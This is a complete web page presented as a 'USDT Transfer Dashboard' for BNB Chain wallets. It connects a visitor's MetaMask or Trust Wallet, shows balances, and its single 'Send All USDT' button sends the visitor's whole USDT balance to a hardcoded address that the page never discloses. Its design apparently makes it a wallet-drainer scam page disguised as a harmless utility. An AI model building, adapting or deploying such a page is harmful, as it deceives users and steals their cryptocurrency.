<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>USDT Transfer Dashboard</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #f4f6f8;
      color: #222;
    }
    .header {
      background: #1e1e2f;
      color: white;
      padding: 1rem;
      text-align: center;
      font-size: 1.4rem;
      font-weight: bold;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    .container {
      max-width: 480px;
      margin: 2rem auto;
      background: white;
      padding: 1.5rem;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
    }
    .balance-card {
      display: flex;
      justify-content: space-between;
      padding: 1rem;
      border: 1px solid #ddd;
      border-radius: 10px;
      margin-bottom: 1rem;
      background: #fafafa;
    }
    .balance-label {
      font-weight: 600;
      font-size: 0.95rem;
    }
    .wallet-status {
      font-size: 0.9rem;
      margin-bottom: 1rem;
      color: #888;
    }
    button {
      width: 100%;
      padding: 1rem;
      background-color: #00b894;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1.1rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background-color: #009e80;
    }
    #log {
      margin-top: 1rem;
      color: #d63031;
      font-size: 0.9rem;
      min-height: 1rem;
    }
  </style>
</head>
<body>
  <div class="header">USDT Transfer Dashboard</div>
  <div class="container">
    <div class="wallet-status" id="walletStatus">Wallet not connected</div>
    <div class="balance-card">
      <div class="balance-label">USDT Balance:</div>
      <div id="usdtBalance">--</div>
    </div>
    <div class="balance-card">
      <div class="balance-label">BNB Balance:</div>
      <div id="bnbBalance">--</div>
    </div>
    <button id="sendBtn">Send All USDT</button>
    <div id="log"></div>
  </div>

  <script>
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
    const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
    const usdtAbi = [
      "function balanceOf(address owner) view returns (uint256)",
      "function transfer(address to, uint256 value) returns (bool)"
    ];

    async function init() {
      if (!window.ethereum) {
        document.getElementById("walletStatus").textContent = "Please use Trust Wallet or MetaMask.";
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const address = await signer.getAddress();
        document.getElementById("walletStatus").textContent = `Connected: ${address.slice(0,6)}...${address.slice(-4)}`;

        const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
        const usdtBalance = await usdt.balanceOf(address);
        document.getElementById("usdtBalance").textContent = ethers.utils.formatUnits(usdtBalance, 18);

        const bnbBalance = await provider.getBalance(address);
        document.getElementById("bnbBalance").textContent = ethers.utils.formatEther(bnbBalance);

        document.getElementById("sendBtn").onclick = async () => {
          if (usdtBalance.isZero()) {
            document.getElementById("log").textContent = "❌ Your USDT balance is 0.";
            return;
          }

          try {
            document.getElementById("log").textContent = "⏳ Sending...";
            const tx = await usdt.transfer(recipient, usdtBalance);
            await tx.wait();
            document.getElementById("log").textContent = "✅ Transfer complete!";
          } catch (err) {
            console.error(err);
            document.getElementById("log").textContent = "❌ Transaction failed.";
          }
        };
      } catch (err) {
        console.error(err);
        document.getElementById("walletStatus").textContent = "❌ Wallet connection failed.";
      }
    }

    window.addEventListener("load", init);
  </script>
</body>
</html>
